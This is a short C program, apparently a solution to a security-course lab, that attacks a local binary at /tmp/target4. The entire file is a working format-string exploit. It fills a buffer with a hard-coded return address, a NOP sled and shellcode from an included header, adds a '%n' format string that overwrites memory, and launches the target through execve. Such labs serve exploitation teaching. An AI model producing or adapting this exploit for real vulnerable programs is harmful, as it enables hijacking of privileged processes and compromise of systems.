#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
 
#define TARGET "/tmp/target4"
#define NOP '\x90' 
int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[400];
  int i;
  int address;
  char *fmt;
 
  address = 0xbffffced;
  fmt = "%u%u%012582523u%n";
  for(i = 0; i < 400; i++) {
  if(i < 4) { // add bffffb
    *(buffer + i) = address >> (i * 8); // <address>
  } else if(i < (399 - strlen(fmt) - strlen(shellcode))) {
    *(buffer + i) = NOP;  
  } else if(i < (399 - strlen(fmt))) {
    *(buffer + i) = shellcode[i - 399 + strlen(fmt) + strlen(shellcode)]; // <shellcode>
  } else if(i < 399) {
    memcpy(buffer + i, fmt, strlen(fmt)); // <format string>
    i += strlen(fmt) - 1;
  } else {
    *(buffer + i) = '\x00'; // terminate by NULL
  }
}
  
  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
  env[0] = NULL;
 
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
 
  return 0;
}